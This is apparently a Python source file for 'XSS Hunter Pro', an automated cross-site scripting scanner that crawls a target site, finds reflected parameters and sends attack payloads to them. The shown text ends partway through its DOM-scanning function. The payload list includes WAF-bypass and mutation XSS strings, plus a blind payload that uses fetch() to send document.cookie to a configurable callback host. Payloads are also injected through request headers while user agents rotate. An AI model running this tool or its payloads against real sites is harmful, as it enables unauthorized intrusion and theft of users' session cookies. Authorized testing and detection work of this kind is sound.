#!/usr/bin/env python3
"""
XSS Hunter Pro - Advanced Automated XSS Vulnerability Scanner
A comprehensive tool for bug bounty hunters and penetration testers
Combines the power of Katana (crawling) + Exparam (parameter discovery) + Advanced XSS Detection

Author: XSS Hunter Pro Team
Version: 3.0.0
"""

import argparse
import html
import json
import os
import re
import stat
import subprocess
import sys
import tempfile
import time
import random
import hashlib
import ipaddress
import logging
import threading
import warnings
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, unquote, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Set, Tuple, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
from termcolor import colored

# Suppress only the specific BeautifulSoup warning, not all warnings
warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)

# Configure logging with restrictive file permissions
_log_file_path = 'xss_hunter_pro.log'
_log_file_handler = logging.FileHandler(_log_file_path)
try:
    os.chmod(_log_file_path, stat.S_IRUSR | stat.S_IWUSR)  # 0600
except OSError:
    pass
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        _log_file_handler,
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============== User-Agent Rotation ==============

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

# ============== Common Hidden Parameters ==============

COMMON_PARAMS = [
    "q", "query", "search", "keyword", "keywords", "term", "text",
    "id", "page", "url", "redirect", "next", "return", "returnUrl",
    "callback", "jsonp", "cb", "api", "data", "json", "xml",
    "file", "path", "folder", "include", "require", "template",
    "name", "title", "desc", "description", "content", "message",
    "input", "value", "val", "param", "arg", "var",
    "p", "s", "r", "l", "link", "src", "source", "target", "dest",
    "ref", "referrer", "lang", "locale", "type", "action", "cmd",
    "comment", "body", "subject", "email", "user", "username",
    "preview", "view", "debug", "test", "error", "msg",
]

# ============== Reflectable Headers ==============

INJECTABLE_HEADERS = [
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Original-URL",
    "X-Rewrite-URL",
    "User-Agent",
    "Accept-Language",
    "X-Custom-IP-Authorization",
    "X-Client-IP",
    "X-Real-IP",
    "True-Client-IP",
    "Origin",
]

# ============== Configuration ==============

@dataclass
class Config:
    """Configuration for XSS Hunter Pro"""
    # Chrome path for headless browser
    chrome_path: str = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

    # Threading
    max_threads: int = 50
    max_async_workers: int = 100

    # Timing
    request_timeout: int = 15
    delay_between_requests: float = 0.1
    browser_wait_time: int = 5

    # Crawling
    crawl_depth: int = 4
    max_urls: int = 10000
    js_crawl: bool = True

    # XSS Detection
    reflection_marker: str = "XSSHUNTERPROTEST"
    blind_xss_callback: str = ""  # e.g., "xss.ht" or custom callback

    # Output
    output_dir: str = "xss_results"
    verbose: bool = False

    # Feature toggles
    test_headers: bool = True
    brute_params: bool = True
    scan_dom: bool = True
    max_retries: int = 3

# ============== HTTP Session Factory ==============

def create_http_session(config: Config) -> requests.Session:
    """Create a requests.Session with retry logic and connection pooling."""
    session = requests.Session()
    retry_strategy = Retry(
        total=config.max_retries,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST", "HEAD", "OPTIONS"],
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=config.max_threads,
        pool_maxsize=config.max_threads,
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers["User-Agent"] = random.choice(USER_AGENTS)
    session.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    session.headers["Accept-Language"] = "en-US,en;q=0.5"
    return session

# ============== XSS Payloads ==============

class XSSPayloadType(Enum):
    REFLECTED = "reflected"
    STORED = "stored"
    DOM = "dom"
    BLIND = "blind"
    MUTATION = "mutation"

@dataclass
class XSSPayload:
    """XSS Payload container"""
    payload: str
    payload_type: XSSPayloadType
    context: str  # html, attribute, script, url, etc.
    bypass_waf: bool = False
    requires_browser: bool = False
    description: str = ""
    priority: int = 1  # 1=high, 2=medium, 3=low (used for ordering)

# Advanced XSS Payloads Database - ordered by effectiveness
XSS_PAYLOADS = [
    # ---- Priority 1: High-value, most likely to succeed ----
    # HTML Context Payloads
    XSSPayload("<script>alert('XSSHUNTERPROTEST')</script>", XSSPayloadType.REFLECTED, "html", False, False, "Basic script injection", 1),
    XSSPayload("<img src=x onerror=alert('XSSHUNTERPROTEST')>", XSSPayloadType.REFLECTED, "html", False, False, "IMG onerror", 1),
    XSSPayload("<svg onload=alert('XSSHUNTERPROTEST')>", XSSPayloadType.REFLECTED, "html", False, False, "SVG onload", 1),
    XSSPayload("<body onload=alert('XSSHUNTERPROTEST')>", XSSPayloadType.REFLECTED, "html", False, False, "Body onload", 1),
    XSSPayload("<input onfocus=alert('XSSHUNTERPROTEST') autofocus>", XSSPayloadType.REFLECTED, "html", False, False, "input onfocus autofocus", 1),
    XSSPayload("<details open ontoggle=alert('XSSHUNTERPROTEST')>", XSSPayloadType.REFLECTED, "html", False, False, "details ontoggle", 1),
    XSSPayload('" onmouseover="alert(\'XSSHUNTERPROTEST\')', XSSPayloadType.REFLECTED, "attribute", False, False, "Double quote attribute break", 1),
    XSSPayload('\' onmouseover=\'alert("XSSHUNTERPROTEST")', XSSPayloadType.REFLECTED, "attribute", False, False, "Single quote attribute break", 1),
    XSSPayload('" onfocus="alert(\'XSSHUNTERPROTEST\')" autofocus="', XSSPayloadType.REFLECTED, "attribute", False, False, "Attribute with autofocus", 1),
    XSSPayload('" onclick="alert(\'XSSHUNTERPROTEST\')', XSSPayloadType.REFLECTED, "attribute", False, False, "onclick event", 1),
    XSSPayload("'-alert('XSSHUNTERPROTEST')-'", XSSPayloadType.REFLECTED, "script", False, False, "Script string break", 1),
    XSSPayload("\\'-alert('XSSHUNTERPROTEST')//", XSSPayloadType.REFLECTED, "script", False, False, "Script escape", 1),
    XSSPayload("</script><script>alert('XSSHUNTERPROTEST')</script>", XSSPayloadType.REFLECTED, "script", False, False, "Script tag break", 1),
    XSSPayload("javascript:alert('XSSHUNTERPROTEST')", XSSPayloadType.REFLECTED, "url", False, False, "javascript protocol", 1),
    XSSPayload('\'"><svg/onload=alert(\'XSSHUNTERPROTEST\')>', XSSPayloadType.REFLECTED, "polyglot", False, False, "Polyglot: attribute + html break", 1),
    XSSPayload('\'"></script><script>alert(\'XSSHUNTERPROTEST\')</script>', XSSPayloadType.REFLECTED, "polyglot", False, False, "Polyglot: script + attribute break", 1),
    XSSPayload('<iframe src="javascript:alert(\'XSSHUNTERPROTEST\')">', XSSPayloadType.REFLECTED, "html", False, False, "iframe javascript src", 2),
    XSSPayload("<audio src=x onerror=alert('XSSHUNTERPROTEST')>", XSSPayloadType.REFLECTED, "html", False, False, "audio onerror", 2),
    XSSPayload("<video src=x onerror=alert('XSSHUNTERPROTEST')>", XSSPayloadType.REFLECTED, "html", False, False, "video onerror", 2),
    XSSPayload("<marquee onstart=alert('XSSHUNTERPROTEST')>", XSSPayloadType.REFLECTED, "html", False, False, "marquee onstart", 2),
    XSSPayload("data:text/html,<script>alert('XSSHUNTERPROTEST')</script>", XSSPayloadType.REFLECTED, "url", False, False, "data URI", 2),
    XSSPayload('data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTSEVOVEVSUFJPVEVTVCcpPC9zY3JpcHQ+', XSSPayloadType.REFLECTED, "url", False, False, "data URI base64", 2),
    XSSPayload("{{constructor.constructor('alert(1)')()}}", XSSPayloadType.REFLECTED, "template", False, True, "Angular template injection", 2),
    XSSPayload("<ScRiPt>alert('XSSHUNTERPROTEST')</ScRiPt>", XSSPayloadType.REFLECTED, "html", True, False, "Case bypass", 2),
    XSSPayload("<script/src=data:,alert('XSSHUNTERPROTEST')>", XSSPayloadType.REFLECTED, "html", True, False, "Data src bypass", 2),
    XSSPayload("<<script>alert('XSSHUNTERPROTEST')//<<script>", XSSPayloadType.REFLECTED, "html", True, False, "Double angle bypass", 2),
    XSSPayload("<script >alert('XSSHUNTERPROTEST')</script >", XSSPayloadType.REFLECTED, "html", True, False, "Space bypass", 2),
    XSSPayload("<svg/onload=alert('XSSHUNTERPROTEST')>", XSSPayloadType.REFLECTED, "html", True, False, "SVG slash bypass", 2),
    XSSPayload("<img src='x' onerror='alert`XSSHUNTERPROTEST`'>", XSSPayloadType.REFLECTED, "html", True, False, "Template literal", 2),
    XSSPayload("<script\t>alert('XSSHUNTERPROTEST')</script\t>", XSSPayloadType.REFLECTED, "html", True, False, "Tab bypass", 3),
    XSSPayload("<script\n>alert('XSSHUNTERPROTEST')</script\n>", XSSPayloadType.REFLECTED, "html", True, False, "Newline bypass", 3),
    XSSPayload("<scr<script>ipt>alert('XSSHUNTERPROTEST')</scr</script>ipt>", XSSPayloadType.REFLECTED, "html", True, False, "Nested script bypass", 3),
    XSSPayload('<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', XSSPayloadType.REFLECTED, "html", True, False, "HTML entity bypass", 3),
    XSSPayload("%3Cscript%3Ealert('XSSHUNTERPROTEST')%3C/script%3E", XSSPayloadType.REFLECTED, "html", True, False, "URL encoded", 3),
    XSSPayload("#<script>alert('XSSHUNTERPROTEST')</script>", XSSPayloadType.DOM, "hash", False, True, "Location hash", 3),
    XSSPayload("?q=<script>alert('XSSHUNTERPROTEST')</script>", XSSPayloadType.DOM, "query", False, True, "Query param DOM", 3),
    XSSPayload("javascript:alert('XSSHUNTERPROTEST')", XSSPayloadType.DOM, "location", False, True, "Location protocol", 3),
    XSSPayload('<script src=https://{CALLBACK}/XSSHUNTERPROTEST></script>', XSSPayloadType.BLIND, "html", False, False, "Blind XSS callback", 2),
    XSSPayload('<img src=x onerror="fetch(\'https://{CALLBACK}/?c=\'+document.cookie)">', XSSPayloadType.BLIND, "html", False, False, "Blind fetch callback", 2),
    XSSPayload("<math><mtext><table><mglyph><style><img src=x onerror=alert('XSSHUNTERPROTEST')>", XSSPayloadType.MUTATION, "html", True, False, "Mutation XSS", 3),
    XSSPayload("<math><mtext><table><mglyph><style><img src=x onerror=alert('XSSHUNTERPROTEST')></style></mglyph></table></mtext></math>", XSSPayloadType.MUTATION, "html", True, True, "DOM Clobbering + Mutation", 3),
    XSSPayload("<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert('XSSHUNTERPROTEST')>", XSSPayloadType.MUTATION, "html", True, True, "Advanced mutation XSS", 3),
]

# ============== Result Models ==============

@dataclass(frozen=True)
class ParameterInfo:
    """Information about a discovered parameter"""
    url: str
    parameter: str
    method: str = "GET"
    post_data: Dict = field(default_factory=dict, compare=False, hash=False)
    headers: Dict = field(default_factory=dict, compare=False, hash=False)
    source: str = "crawl"  # crawl, form, js, header, brute

@dataclass
class XSSResult:
    """XSS Vulnerability Result"""
    url: str
    parameter: str
    payload: str
    payload_type: XSSPayloadType
    context: str
    method: str = "GET"
    evidence: str = ""
    confidence: int = 0  # 0-100
    requires_browser: bool = False
    waf_bypass: bool = False
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "type": self.payload_type.value,
            "context": self.context,
            "method": self.method,
            "evidence": self.evidence,
            "confidence": self.confidence,
            "requires_browser": self.requires_browser,
            "waf_bypass": self.waf_bypass,
            "timestamp": self.timestamp
        }

    @property
    def dedup_key(self) -> Tuple[str, str, str]:
        """Key used to deduplicate results."""
        return (self.url, self.parameter, self.payload_type.value)

# ============== Katana Integration ==============

def _is_in_scope(url: str, target_domain: str) -> bool:
    """Check if a URL belongs to the target domain or a subdomain of it."""
    parsed = urlparse(url)
    host = parsed.netloc.lower().split(":")[0]  # strip port
    target = target_domain.lower().split(":")[0]
    return host == target or host.endswith("." + target)


def _is_html_response(response: requests.Response) -> bool:
    """Return True only when the response Content-Type indicates HTML.

    JSON, XML, plain-text, images, etc. are NOT HTML and should not be
    treated as potential XSS rendering contexts.
    """
    ct = response.headers.get("Content-Type", "").lower()
    return "text/html" in ct or "application/xhtml" in ct


def _normalize_url_pattern(url: str) -> str:
    """Normalize a URL into an endpoint pattern for deduplication.

    Replaces numeric-only path segments with ``{id}`` so that
    ``/test/detail/54538/slug`` and ``/test/detail/46909/slug`` collapse
    to the same pattern ``/test/detail/{id}/slug``.  This prevents the
    scanner from testing the same endpoint hundreds of times just because
    the site has many items with different IDs.
    """
    parsed = urlparse(url)
    # Normalize path: replace pure-numeric segments with {id}
    parts = parsed.path.rstrip("/").split("/")
    normalized_parts = []
    for part in parts:
        if part and part.isdigit():
            normalized_parts.append("{id}")
        else:
            normalized_parts.append(part)
    normalized_path = "/".join(normalized_parts) or "/"
    return f"{parsed.scheme}://{parsed.netloc}{normalized_path}"


class KatanaCrawler:
    """Katana-based web crawler integration"""

    def __init__(self, config: Config):
        self.config = config
        self.crawled_urls: Set[str] = set()
        self.parameters: Set[ParameterInfo] = set()
        self.target_domain: str = ""

    def check_katana_installed(self) -> bool:
        """Check if Katana is installed"""
        try:
            result = subprocess.run(
                ["katana", "--version"],
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def crawl(self, target: str, headless: bool = False, scope: str = "") -> Tuple[Set[str], Set[ParameterInfo]]:
        """
        Crawl target using Katana
        Returns (urls, parameters)
        """
        # Remember the target domain for scope filtering
        self.target_domain = urlparse(target).netloc.lower().split(":")[0]

        if not self.check_katana_installed():
            logger.warning("Katana not found, using built-in crawler")
            urls, params = self._builtin_crawl(target)
            self.crawled_urls = urls
            return urls, params

        logger.info(f"Starting Katana crawl for: {target}")

        # Use a secure temp file for Katana output
        fd, katana_output = tempfile.mkstemp(suffix=".txt", prefix="katana_output_")
        os.close(fd)

        # Build Katana command
        cmd = [
            "katana",
            "-u", target,
            "-d", str(self.config.crawl_depth),
            "-c", str(self.config.max_threads),
            "-aff",  # Automatic form filling
            "-fx",   # Form extraction
            "-jc",   # JavaScript crawl
            "-jsl",  # JSluice
            "-kf", "all",  # Known files (robots.txt, sitemap.xml)
            "-o", katana_output,
            "-jsonl",
            "-silent"
        ]

        if headless:
            cmd.extend([
                "-headless",
                "-system-chrome",
                "-scp", self.config.chrome_path,
                "-nos",  # No sandbox
                "-xhr"   # XHR extraction
            ])

        if scope:
            cmd.extend(["-cs", scope])

        try:
            logger.info(f"Running: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            # Parse JSONL output
            urls: Set[str] = set()
            parameters: Set[ParameterInfo] = set()

            try:
                with open(katana_output, "r") as f:
                    for line in f:
                        if line.strip():
                            try:
                                data = json.loads(line)
                                url = data.get("request", {}).get("endpoint", "")
                                if url and _is_in_scope(url, self.target_domain):
                                    urls.add(url)

                                    # Extract parameters from URL
                                    parsed = urlparse(url)
                                    query_params = parse_qs(parsed.query)

                                    for param in query_params:
                                        parameters.add(ParameterInfo(
                                            url=f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                                            parameter=param,
                                            source="crawl"
                                        ))

                                    # Extract form parameters
                                    forms = data.get("form", [])
                                    if forms:
                                        for form in forms:
                                            for inp in form.get("inputs", []):
                                                if inp.get("name"):
                                                    parameters.add(ParameterInfo(
                                                        url=url,
                                                        parameter=inp.get("name"),
                                                        method=form.get("method", "GET"),
                                                        source="form"
                                                    ))
                            except json.JSONDecodeError:
                                continue
            except FileNotFoundError:
                pass

            # Enforce max_urls
            if len(urls) > self.config.max_urls:
                urls = set(list(urls)[:self.config.max_urls])

            self.crawled_urls = urls
            logger.info(f"Katana found {len(urls)} URLs and {len(parameters)} parameters")
            return urls, parameters

        except subprocess.TimeoutExpired:
            logger.error("Katana crawl timed out")
            return set(), set()
        except Exception as e:
            logger.error(f"Katana error: {e}")
            return set(), set()
        finally:
            if os.path.exists(katana_output):
                os.remove(katana_output)

    def _builtin_crawl(self, target: str) -> Tuple[Set[str], Set[ParameterInfo]]:
        """Built-in recursive crawler fallback when Katana is not installed."""
        urls: Set[str] = set()
        parameters: Set[ParameterInfo] = set()
        visited: Set[str] = set()
        session = create_http_session(self.config)

        target_parsed = urlparse(target)
        target_domain = target_parsed.netloc

        queue: List[Tuple[str, int]] = [(target, 0)]

        while queue:
            current_url, depth = queue.pop(0)

            if current_url in visited:
                continue
            if depth > self.config.crawl_depth:
                continue
            if len(urls) >= self.config.max_urls:
                break

            # Stay in scope: target domain + subdomains only
            parsed = urlparse(current_url)
            if parsed.netloc and not _is_in_scope(current_url, target_domain):
                continue

            visited.add(current_url)
            urls.add(current_url)

            # Extract parameters from the URL itself
            query_params = parse_qs(parsed.query)
            for param in query_params:
                parameters.add(ParameterInfo(
                    url=f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                    parameter=param,
                    source="crawl"
                ))

            try:
                response = session.get(current_url, timeout=self.config.request_timeout)
                soup = BeautifulSoup(response.text, "html.parser")

                # Extract all links and queue them for deeper crawling
                for link in soup.find_all("a", href=True):
                    href = link["href"]
                    full_url = urljoin(current_url, href)
                    # Strip fragments
                    full_url = full_url.split("#")[0]
                    if full_url and full_url not in visited:
                        link_parsed = urlparse(full_url)
                        if _is_in_scope(full_url, target_domain) and link_parsed.scheme in ("http", "https"):
                            queue.append((full_url, depth + 1))

                            # Extract params from discovered link
                            for param in parse_qs(link_parsed.query):
                                parameters.add(ParameterInfo(
                                    url=f"{link_parsed.scheme}://{link_parsed.netloc}{link_parsed.path}",
                                    parameter=param,
                                    source="crawl"
                                ))

                # Extract form parameters
                for form in soup.find_all("form"):
                    action = form.get("action", "")
                    form_url = urljoin(current_url, action) if action else current_url
                    method = form.get("method", "GET").upper()

                    post_data: Dict[str, str] = {}
                    for inp in form.find_all(["input", "textarea", "select"]):
                        name = inp.get("name")
                        if name:
                            value = inp.get("value", "")
                            post_data[name] = value

                    for name in post_data:
                        parameters.add(ParameterInfo(
                            url=form_url,
                            parameter=name,
                            method=method,
                            post_data=post_data,
                            source="form"
                        ))

                # Respect rate-limiting
                if self.config.delay_between_requests > 0:
                    time.sleep(self.config.delay_between_requests)

            except Exception as e:
                logger.debug(f"Built-in crawl error for {current_url}: {e}")

        logger.info(f"Built-in crawler found {len(urls)} URLs and {len(parameters)} parameters")
        return urls, parameters

# ============== Exparam Integration ==============

class ExparamScanner:
    """Exparam-based reflected parameter scanner"""

    def __init__(self, config: Config, session: requests.Session):
        self.config = config
        self.session = session
        self.reflection_marker = config.reflection_marker

    def check_reflection(self, url: str, param: str, payload: str = None) -> Optional[str]:
        """Check if parameter reflects its value"""
        test_value = payload or self.reflection_marker

        try:
            response = self.session.get(
                url,
                params={param: test_value},
                timeout=self.config.request_timeout,
                allow_redirects=True
            )
            if self.config.delay_between_requests > 0:
                time.sleep(self.config.delay_between_requests)

            # Skip non-HTML responses — JSON/XML APIs can't render XSS
            if not _is_html_response(response):
                logger.debug(f"Skipping non-HTML response for {url}?{param} (Content-Type: {response.headers.get('Content-Type', 'unknown')})")
                return None

            return self._analyze_response(response.text, test_value, url, param)

        except requests.exceptions.RequestException as e:
            logger.debug(f"Request error for {url}?{param}: {e}")
            return None

    def check_post_reflection(self, url: str, param: str, post_data: Dict, payload: str = None) -> Optional[str]:
        """Check POST parameter reflection"""
        test_value = payload or self.reflection_marker

        try:
            test_data = post_data.copy()
            test_data[param] = test_value

            response = self.session.post(
                url,
                data=test_data,
                timeout=self.config.request_timeout,
                allow_redirects=True
            )
            if self.config.delay_between_requests > 0:
                time.sleep(self.config.delay_between_requests)

            # Skip non-HTML responses — JSON/XML APIs can't render XSS
            if not _is_html_response(response):
                logger.debug(f"Skipping non-HTML POST response for {url} -> {param}")
                return None

            return self._analyze_response(response.text, test_value, url, param)

        except requests.exceptions.RequestException as e:
            logger.debug(f"POST request error: {e}")
            return None

    def check_header_reflection(self, url: str, header: str, payload: str = None) -> Optional[str]:
        """Check header value reflection"""
        test_value = payload or self.reflection_marker

        try:
            response = self.session.get(
                url,
                headers={header: test_value},
                timeout=self.config.request_timeout,
                allow_redirects=True
            )
            if self.config.delay_between_requests > 0:
                time.sleep(self.config.delay_between_requests)

            # Skip non-HTML responses
            if not _is_html_response(response):
                return None

            return self._analyze_response(response.text, test_value, url, f"Header:{header}")

        except requests.exceptions.RequestException as e:
            logger.debug(f"Header request error: {e}")
            return None

    def _analyze_response(self, response_text: str, test_value: str, url: str, param: str) -> Optional[str]:
        """Analyze response for reflection"""
        decoded_response = unquote(response_text)

        # Check basic reflection
        if test_value not in decoded_response:
            return None

        # Check reflection context using BeautifulSoup
        try:
            soup = BeautifulSoup(decoded_response, "html.parser")

            # Check script context
            for script in soup.find_all("script"):
                if script.string and test_value in script.string:
                    return f"REFLECTED_IN_SCRIPT:{url}?{param}={test_value}"

            # Check attribute context
            for tag in soup.find_all(True):
                for attr_name, attr_value in tag.attrs.items():
                    if isinstance(attr_value, list):
                        attr_value = " ".join(attr_value)
                    if test_value in str(attr_value):
                        return f"REFLECTED_IN_ATTR:{url}?{param}={test_value}"

            # Check HTML context
            for text in soup.find_all(string=lambda x: x and test_value in x):
                return f"REFLECTED_IN_HTML:{url}?{param}={test_value}"

        except Exception:
            pass

        return f"REFLECTED:{url}?{param}={test_value}"

# ============== XSS Scanner Engine ==============

class XSSScanner:
    """Advanced XSS Scanner Engine"""

    def __init__(self, config: Config, session: requests.Session):
        self.config = config
        self.session = session
        self.exparam = ExparamScanner(config, session)
        self.results: List[XSSResult] = []
        self._tested_lock = threading.Lock()
        self.tested_params: Set[Tuple[str, str, str]] = set()  # (url, param, payload)

    def _is_tested(self, key: Tuple[str, str, str]) -> bool:
        """Thread-safe check-and-add for tested params."""
        with self._tested_lock:
            if key in self.tested_params:
                return True
            self.tested_params.add(key)
            return False

    def scan_parameter(self, param_info: ParameterInfo) -> List[XSSResult]:
        """Scan a single parameter for XSS vulnerabilities"""
        results = []

        # Skip already tested combinations
        test_key = (param_info.url, param_info.parameter, "")
        if self._is_tested(test_key):
            return results

        # First check if parameter reflects
        reflection = None
        if param_info.method == "GET":
            reflection = self.exparam.check_reflection(param_info.url, param_info.parameter)
        elif param_info.method == "POST":
            reflection = self.exparam.check_post_reflection(param_info.url, param_info.parameter, param_info.post_data)

        if not reflection:
            logger.debug(f"No reflection found for {param_info.url}?{param_info.parameter}")
            return results

        logger.info(colored(f"[REFLECTION] {param_info.url}?{param_info.parameter}", "yellow"))

        # Determine reflection context to prioritize payloads
        context_hint = ""
        if reflection.startswith("REFLECTED_IN_SCRIPT"):
            context_hint = "script"
        elif reflection.startswith("REFLECTED_IN_ATTR"):
            context_hint = "attribute"
        elif reflection.startswith("REFLECTED_IN_HTML"):
            context_hint = "html"

        # Sort payloads: matching context first, then by priority
        sorted_payloads = sorted(
            XSS_PAYLOADS,
            key=lambda p: (
                0 if p.context == context_hint else 1,
                p.priority,
            )
        )

        # Test payloads for this parameter
        for payload_obj in sorted_payloads:
            # Skip blind payloads if no callback configured
            if payload_obj.payload_type == XSSPayloadType.BLIND and not self.config.blind_xss_callback:
                continue

            test_key = (param_info.url, param_info.parameter, payload_obj.payload)
            if self._is_tested(test_key):
                continue

            result = self._test_xss_payload(param_info, payload_obj)
            if result:
                results.append(result)
                logger.info(colored(f"[XSS FOUND] {param_info.url}?{param_info.parameter} | {payload_obj.payload_type.value}", "green"))

        return results

    def _resolve_payload(self, payload_obj: XSSPayload) -> str:
        """Substitute placeholders in payload (e.g. blind callback domain)."""
        payload = payload_obj.payload
        if "{CALLBACK}" in payload and self.config.blind_xss_callback:
            payload = payload.replace("{CALLBACK}", self.config.blind_xss_callback)
        return payload

    def _test_xss_payload(self, param_info: ParameterInfo, payload_obj: XSSPayload) -> Optional[XSSResult]:
        """Test a specific XSS payload"""
        resolved_payload = self._resolve_payload(payload_obj)

        try:
            if param_info.method == "GET":
                response = self.session.get(
                    param_info.url,
                    params={param_info.parameter: resolved_payload},
                    timeout=self.config.request_timeout,
                    allow_redirects=True
                )
            else:
                post_data = param_info.post_data.copy()
                post_data[param_info.parameter] = resolved_payload
                response = self.session.post(
                    param_info.url,
                    data=post_data,
                    timeout=self.config.request_timeout,
                    allow_redirects=True
                )

            if self.config.delay_between_requests > 0:
                time.sleep(self.config.delay_between_requests)

            # Skip non-HTML responses — payload in JSON/XML won't execute as XSS
            if not _is_html_response(response):
                return None

            # Check if payload is reflected unencoded
            decoded_response = unquote(response.text)

            if resolved_payload in decoded_response:
                return XSSResult(
                    url=param_info.url,
                    parameter=param_info.parameter,
                    payload=resolved_payload,
                    payload_type=payload_obj.payload_type,
                    context=payload_obj.context,
                    method=param_info.method,
                    evidence="Payload reflected unencoded in response",
                    confidence=self._calculate_confidence(payload_obj, resolved_payload, decoded_response),
                    requires_browser=payload_obj.requires_browser,
                    waf_bypass=payload_obj.bypass_waf
                )

            # Check for partial reflection (encoded context) - only for high-signal patterns
            partial = self._check_partial_reflection(resolved_payload, decoded_response)
            if partial:
                return XSSResult(
                    url=param_info.url,
                    parameter=param_info.parameter,
                    payload=resolved_payload,
                    payload_type=payload_obj.payload_type,
                    context=payload_obj.context,
                    method=param_info.method,
                    evidence=f"Partial reflection: {partial}",
                    confidence=40,
                    requires_browser=True,
                    waf_bypass=payload_obj.bypass_waf
                )

        except requests.exceptions.RequestException as e:
            logger.debug(f"Request error: {e}")

        return None

    def _calculate_confidence(self, payload_obj: XSSPayload, resolved_payload: str, response: str) -> int:
        """Calculate confidence score based on how the specific payload is reflected."""
        base_confidence = 60

        lower_payload = resolved_payload.lower()
        lower_response = response.lower()

        # Unbroken <script>...</script> reflection is very high confidence
        if "<script" in lower_payload and "</script>" in lower_payload:
            if "<script" in lower_response and "</script>" in lower_response:
                base_confidence += 25

        # Event handler payload that is reflected
        event_handlers = ["onerror=", "onload=", "onfocus=", "onclick=", "onmouseover=", "ontoggle="]
        for handler in event_handlers:
            if handler in lower_payload and handler in lower_response:
                base_confidence += 20
                break

        # Attribute breakout
        if payload_obj.context == "attribute":
            if ('"' in resolved_payload and '"' in response) or ("'" in resolved_payload and "'" in response):
                base_confidence += 15

        # WAF bypass success (tested payload got through)
        if payload_obj.bypass_waf:
            base_confidence += 10

        # Polyglot payloads that work are high-value
        if payload_obj.context == "polyglot":
            base_confidence += 5

        return min(100, base_confidence)

    def _check_partial_reflection(self, payload: str, response: str) -> Optional[str]:
        """
        Check for partial payload reflection.
        Only returns a match when the payload specific dangerous construct
        appears in the response (not just generic words).
        """
        patterns: List[str] = []

        # Check for reflected event handlers from the payload
        handler_re = re.compile(r'(on\w+=)', re.IGNORECASE)
        payload_handlers = handler_re.findall(payload)
        for handler in payload_handlers:
            if handler.lower() in response.lower():
                patterns.append(handler.rstrip("="))

        # Check for reflected HTML tags from the payload
        tag_re = re.compile(r'<(/?\w+)', re.IGNORECASE)
        payload_tags = tag_re.findall(payload)
        for tag in payload_tags:
            tag_lower = tag.lower()
            # Only flag dangerous tags, not common ones
            if tag_lower in ("script", "/script", "svg", "img", "iframe", "object", "embed", "math"):
                if f"<{tag}" in response or f"<{tag.lower()}" in response.lower():
                    patterns.append(f"<{tag}>")

        if patterns:
            return ", ".join(patterns[:3])
        return None

    def scan_dom_xss(self, url: str, target_domain: str = "") -> List[XSSResult]:
        """Scan for DOM XSS vulnerabilities.

        Only analyses inline JS and external JS files hosted on the target
        domain (or its subdomains).  Requires source and sink to appear
        within the same function-sized proximity window (500 chars) to
        reduce false positives.
        """
        results = []

        # Dangerous sinks - places where data can cause execution
        dangerous_sinks = [
            r"document\.write\s*\(",
            r"document\.writeln\s*\(",
            r"\.innerHTML\s*=",
            r"\.outerHTML\s*=",
            r"eval\s*\(",
            r"setTimeout\s*\(\s*['\"]",
            r"setInterval\s*\(\s*['\"]",
            r"Function\s*\(",
            r"location\.href\s*=",
            r"location\.assign\s*\(",
            r"location\.replace\s*\(",
            r"window\.open\s*\(",
        ]

        # Dangerous sources - places where attacker-controlled data enters
        dangerous_sources = [
            r"location\.hash",
            r"location\.search",
            r"location\.href(?!\s*=)",
            r"document\.URL",
            r"document\.documentURI",
            r"document\.referrer",
            r"window\.name",
            r"localStorage\.getItem",
            r"sessionStorage\.getItem",
            r"document\.cookie",
            r"postMessage",
        ]

        # Maximum character distance between source and sink to consider
        # them related.  500 chars ≈ a single function body.
        PROXIMITY_WINDOW = 500

        try:
            response = self.session.get(url, timeout=self.config.request_timeout)

            # Skip non-HTML responses (JSON APIs, images, etc.)
            if not _is_html_response(response):
                return results

            soup = BeautifulSoup(response.text, "html.parser")

            # Collect all JavaScript to analyze
            js_blocks: List[Tuple[str, str]] = []  # (source_label, js_content)

            for script in soup.find_all("script"):
                if script.string:
                    js_blocks.append(("inline", script.string))

